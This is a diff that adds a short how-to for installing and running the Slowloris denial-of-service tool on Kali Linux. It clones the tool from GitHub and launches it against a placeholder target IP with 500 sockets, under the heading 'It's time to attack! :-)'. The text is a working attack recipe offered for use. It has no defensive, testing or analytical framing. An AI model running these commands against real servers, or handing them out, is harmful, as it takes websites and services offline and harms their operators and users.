@@ -1,0 +1,17 @@
+## Install Slowloris DDoS tool on Kali Linux ##
+
+# Open console
+
+mkdir Slowloris
+
+cd Slowloris
+
+# Download slowloris from Github
+
+git clone https://github.com/gkbrk/slowloris.git
+
+# It's time to attack! :-)
+
+cd slowloris
+
+python3 slowloris.py (target-IP) -s 500
